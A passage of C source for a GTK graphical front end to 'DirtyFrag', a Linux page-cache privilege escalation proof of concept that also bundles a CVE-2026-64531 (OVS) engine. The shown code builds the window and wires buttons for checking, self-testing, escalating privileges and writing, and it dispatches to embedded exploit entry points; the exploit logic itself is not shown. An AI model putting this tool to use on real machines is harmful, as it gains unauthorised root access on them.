        gtk_window_set_default_size(GTK_WINDOW(a->window), ww, hh);
    }
    gtk_window_set_icon_name(GTK_WINDOW(a->window), "security-high");
    gtk_widget_set_name(a->window, "mainwin");

    a->header = build_header(a);
    gtk_window_set_titlebar(GTK_WINDOW(a->window), a->header);

    /* 背景层: overlay 的底层 child, 随窗口伸缩 */
    overlay = gtk_overlay_new();
    a->bg_area = gtk_drawing_area_new();
    gtk_widget_set_hexpand(a->bg_area, TRUE);
    gtk_widget_set_vexpand(a->bg_area, TRUE);
    g_signal_connect(a->bg_area, "draw", G_CALLBACK(on_bg_draw), a);
    g_signal_connect(a->window, "configure-event", G_CALLBACK(on_configure), a);
    gtk_container_add(GTK_CONTAINER(overlay), a->bg_area);
    gtk_container_add(GTK_CONTAINER(a->window), overlay);

    /* ── 顶部: 链选择 + 说明 ── */
    gtk_widget_set_name(head, "chainbox");
    gtk_widget_set_margin_start(head, 12);
    gtk_widget_set_margin_end(head, 12);
    gtk_widget_set_margin_top(head, 8);

    a->combo = gtk_combo_box_text_new();
    gtk_combo_box_text_append_text(GTK_COMBO_BOX_TEXT(a->combo),
                                   "全部（dirtyfrag 五链，仅检查 / 自测）");
    {
        int i;
        for (i = 0; i < N_CHAINS; i++) {
            char label[128];
            g_snprintf(label, sizeof(label), "%s", chains[i].tag);
            gtk_combo_box_text_append_text(GTK_COMBO_BOX_TEXT(a->combo), label);
        }
    }
    gtk_combo_box_set_active(GTK_COMBO_BOX(a->combo), 0);
    gtk_widget_set_size_request(a->combo, 260, -1);
    gtk_widget_set_halign(a->combo, GTK_ALIGN_START);
    gtk_box_pack_start(GTK_BOX(chainbox), a->combo, FALSE, FALSE, 0);

    a->lbl_name = gtk_label_new(NULL);
    gtk_widget_set_halign(a->lbl_name, GTK_ALIGN_START);
    gtk_label_set_use_markup(GTK_LABEL(a->lbl_name), TRUE);
    gtk_widget_set_name(a->lbl_name, "title-name");
    gtk_box_pack_start(GTK_BOX(chainbox), a->lbl_name, FALSE, FALSE, 0);

    a->lbl_desc = gtk_label_new(NULL);
    gtk_label_set_xalign(GTK_LABEL(a->lbl_desc), 0.0f);
    gtk_label_set_line_wrap(GTK_LABEL(a->lbl_desc), TRUE);
    gtk_box_pack_start(GTK_BOX(chainbox), a->lbl_desc, FALSE, FALSE, 0);

    a->lbl_need = gtk_label_new(NULL);
    gtk_widget_set_name(a->lbl_need, "hint");
    gtk_label_set_xalign(GTK_LABEL(a->lbl_need), 0.0f);
    gtk_label_set_line_wrap(GTK_LABEL(a->lbl_need), TRUE);
    gtk_box_pack_start(GTK_BOX(chainbox), a->lbl_need, FALSE, FALSE, 0);

    gtk_box_pack_start(GTK_BOX(head), chainbox, FALSE, FALSE, 0);

    /* ── root 警告横幅 ── */
    a->banner = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 8);
    gtk_widget_set_name(a->banner, "banner-warn");
    a->banner_lbl = gtk_label_new(NULL);
    gtk_label_set_xalign(GTK_LABEL(a->banner_lbl), 0.0f);
    gtk_label_set_line_wrap(GTK_LABEL(a->banner_lbl), TRUE);
    gtk_box_pack_start(GTK_BOX(a->banner), a->banner_lbl, TRUE, TRUE, 0);
    gtk_box_pack_start(GTK_BOX(head), a->banner, FALSE, FALSE, 0);
    gtk_widget_set_no_show_all(a->banner, TRUE);

    /* ── 参数区 ── */
    frame_params = gtk_frame_new("参数");
    gtk_style_context_add_class(gtk_widget_get_style_context(frame_params), "card");
    gtk_widget_set_margin_start(frame_params, 12);
    gtk_widget_set_margin_end(frame_params, 12);
    gtk_widget_set_margin_top(frame_params, 8);
    {
        GtkWidget *inner = gtk_box_new(GTK_ORIENTATION_VERTICAL, 4);
        GtkWidget *p = build_params(a);

        gtk_widget_set_margin_start(p, 10);
        gtk_widget_set_margin_end(p, 10);
        gtk_widget_set_margin_top(p, 8);
        gtk_widget_set_margin_bottom(p, 8);
        gtk_box_pack_start(GTK_BOX(inner), p, FALSE, FALSE, 0);
        gtk_container_add(GTK_CONTAINER(frame_params), inner);
    }

    /* ── 按钮区 ── */
    frame_actions = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 0);
    gtk_widget_set_margin_start(frame_actions, 12);
    gtk_widget_set_margin_end(frame_actions, 12);
    gtk_widget_set_margin_top(frame_actions, 8);
    gtk_box_pack_start(GTK_BOX(frame_actions), build_actions(a), TRUE, TRUE, 0);

    /* ── 日志 ── */
    pane = build_log_pane(a);
    gtk_widget_set_margin_start(pane, 12);
    gtk_widget_set_margin_end(pane, 12);
    gtk_widget_set_margin_top(pane, 8);
    gtk_widget_set_margin_bottom(pane, 6);
    gtk_widget_set_vexpand(pane, TRUE);

    /* ── 状态栏 ── */
    gtk_widget_set_margin_start(statusbar, 12);
    gtk_widget_set_margin_end(statusbar, 12);
    gtk_widget_set_margin_bottom(statusbar, 8);

    a->spinner = gtk_spinner_new();
    gtk_box_pack_start(GTK_BOX(statusbar), a->spinner, FALSE, FALSE, 0);

    a->status_lbl = gtk_label_new("就绪");
    gtk_widget_set_name(a->status_lbl, "status-run");
    gtk_label_set_xalign(GTK_LABEL(a->status_lbl), 0.0f);
    gtk_box_pack_start(GTK_BOX(statusbar), a->status_lbl, TRUE, TRUE, 0);

    {
        GtkWidget *env = gtk_label_new(NULL);
        gtk_widget_set_name(env, "hint");
        g_snprintf(status, sizeof(status), "%s · %s · 内核 %s",
                   user_name(), getuid() == 0 ? "root" : "普通用户",
                   kernel_release());
        gtk_label_set_text(GTK_LABEL(env), status);
        gtk_box_pack_end(GTK_BOX(statusbar), env, FALSE, FALSE, 0);
    }

    gtk_box_pack_start(GTK_BOX(vbox), head, FALSE, FALSE, 0);

    /* ── 扩展面板 (左上角「展开」控制) ── */
    a->revealer = gtk_revealer_new();
    gtk_revealer_set_transition_type(GTK_REVEALER(a->revealer),
                                     GTK_REVEALER_TRANSITION_TYPE_SLIDE_DOWN);
    gtk_revealer_set_transition_duration(GTK_REVEALER(a->revealer), 160);
    gtk_revealer_set_reveal_child(GTK_REVEALER(a->revealer), FALSE);
    {
        GtkWidget *uaf = build_uaf_panel(a);

        gtk_widget_set_margin_start(uaf, 12);
        gtk_widget_set_margin_end(uaf, 12);
        gtk_widget_set_margin_top(uaf, 8);
        gtk_container_add(GTK_CONTAINER(a->revealer), uaf);
    }
    gtk_box_pack_start(GTK_BOX(vbox), a->revealer, FALSE, FALSE, 0);

    gtk_box_pack_start(GTK_BOX(vbox), frame_params, FALSE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(vbox), frame_actions, FALSE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(vbox), pane, TRUE, TRUE, 0);
    gtk_box_pack_start(GTK_BOX(vbox), statusbar, FALSE, FALSE, 0);

    gtk_widget_set_hexpand(vbox, TRUE);
    gtk_widget_set_vexpand(vbox, TRUE);
    gtk_widget_set_halign(vbox, GTK_ALIGN_FILL);
    gtk_widget_set_valign(vbox, GTK_ALIGN_FILL);
    gtk_overlay_add_overlay(GTK_OVERLAY(overlay), vbox);
    /* ── 信号 ── */
    g_signal_connect(a->combo, "changed", G_CALLBACK(on_combo_changed), a);
    g_signal_connect(a->btn_check, "clicked", G_CALLBACK(act_check), a);
    g_signal_connect(a->btn_test, "clicked", G_CALLBACK(act_test), a);
    g_signal_connect(a->btn_find, "clicked", G_CALLBACK(act_find), a);
    g_signal_connect(a->btn_lpe, "clicked", G_CALLBACK(act_lpe), a);
    g_signal_connect(a->btn_write, "clicked", G_CALLBACK(act_write), a);
    g_signal_connect(a->btn_stop, "clicked", G_CALLBACK(act_stop), a);
    g_signal_connect(a->btn_send, "clicked", G_CALLBACK(act_send), a);
    g_signal_connect(a->btn_ctrlc, "clicked", G_CALLBACK(act_ctrlc), a);
    g_signal_connect(a->entry_input, "activate", G_CALLBACK(on_entry_activate), a);
    g_signal_connect(a->window, "destroy", G_CALLBACK(on_window_destroy), a);

    /* 浏览按钮: file-set 后把本地路径填进 entry */
    /* (在 build_params 里已断开错误连接, 这里统一重连) */

    update_desc(a);

    /* root 警告 */
    if (getuid() == 0) {
        gtk_label_set_text(GTK_LABEL(a->banner_lbl),
                           "当前以 root 运行：提权链无法证明有效，-test 结果也没有参考价值。"
                           "请用普通用户身份启动本程序。");
        gtk_widget_set_no_show_all(a->banner, FALSE);
        gtk_widget_show_all(a->banner);
    }
}

/* ---------------------------------------------------------------------------
 * main
 * ------------------------------------------------------------------------ */
int main(int argc, char **argv)
{
    App app;
    const char *poc = NULL;
    const char *bg = NULL;
    int i, j;

    /*
     * 内部引擎模式: GUI 启动子进程时 exec 自身并加上 --engine,
     * 这里把参数原样转给链接进来的 poc 入口, 行为与独立 poc 完全一致。
     */
    if (argc > 1 && !strcmp(argv[1], "--engine")) {
        int rc;

        argv++;
        argc--;
        argv[0] = (char *)"dirtyfrag-gui";
        rc = dirtyfrag_poc_main(argc, argv);
        fflush(NULL);
        return rc;
    }

    /* 第二条内置引擎: CVE-2026-64531 (OVS)，入口名不同 */
    if (argc > 1 && !strcmp(argv[1], "--ovs")) {
        int rc;

        argv++;
        argc--;
        argv[0] = (char *)"dirtyfrag-gui";
        rc = ovswrap_main(argc, argv);
        fflush(NULL);
        return rc;
    }

    memset(&app, 0, sizeof(app));
    app.master_fd = -1;
    app.cur_fg = -1;
    app.csi = g_string_new(NULL);
    app.run = g_string_new(NULL);

    /* 先摘掉自己的参数, 免得 gtk_init 报错 */
    for (i = 1, j = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--poc") && i + 1 < argc) {
            poc = argv[++i];
            continue;
        }
        if (!strcmp(argv[i], "--bg") && i + 1 < argc) {
            bg = argv[++i];
            continue;
        }
        if (!strcmp(argv[i], "--help") || !strcmp(argv[i], "-h")) {
            printf("用法: %s [--poc <路径>] [--bg <图片>]\n\n"
                   "  --poc <路径>   改用外部 poc 可执行文件 (默认用内置引擎,\n"
                   "                 也可用环境变量 DIRTYFRAG_POC)\n"
                   "  --bg  <图片>   指定窗口背景图 (默认找同目录 bg.png,\n"
                   "                 其次 assets/bg.png 与 /usr/share/dirtyfrag/)\n"
                   "                 也可用环境变量 DIRTYFRAG_BG\n", argv[0]);
            return 0;
        }
        argv[j++] = argv[i];
    }
    argc = j;
    argv[argc] = NULL;

    app.poc_path = find_poc(poc, &app.poc_builtin);
    app.bg_path = find_bg(bg);

    gtk_init(&argc, &argv);
    install_css();

    if (app.bg_path) {
        GError *err = NULL;

        app.bg_pix = gdk_pixbuf_new_from_file(app.bg_path, &err);
        if (!app.bg_pix) {
            fprintf(stderr, "背景图加载失败 (%s): %s\n", app.bg_path,
                    err ? err->message : "未知错误");
            g_clear_error(&err);
        }
    }

    build_window(&app);

    gtk_widget_show_all(app.window);

    /* 启动横幅写入日志 */
    {
        char head[512];
        g_snprintf(head, sizeof(head),
                   "\033[36mDirtyFrag 五链页缓存提权 PoC\033[0m  图形前端"
                   "  \033[2m构建 %s\033[0m\n"
                   "\033[2m引擎: %s\033[0m\n"
                   "\033[2m仅供参考与授权测试。先用「检查配置」和「自测」判断本机可用性。\033[0m\n",
                   DF_BUILD,
                   app.poc_builtin ? "内置 (本程序 --engine)"
                                   : (app.poc_path ? app.poc_path : "未找到"));
        ansi_feed(&app, head, strlen(head));
        log_flush(&app);
    }

    if (!app.poc_path) {
        log_append_plain(&app,
                         "\n[!] 引擎不可用 (无法定位本程序路径)。\n"
                         "    可用 --poc <路径> 指定外部 poc。\n");
        gtk_label_set_text(GTK_LABEL(app.status_lbl), "引擎不可用");
        gtk_widget_set_name(app.status_lbl, "status-err");
    }

    gtk_main();

    if (app.csi)
        g_string_free(app.csi, TRUE);
    if (app.run)
        g_string_free(app.run, TRUE);
    g_free(app.poc_path);
    g_free(app.bg_path);
    if (app.bg_pix)
        g_object_unref(app.bg_pix);
    if (app.bg_surf)
        cairo_surface_destroy(app.bg_surf);

    return app.last_exit ? 1 : 0;
}
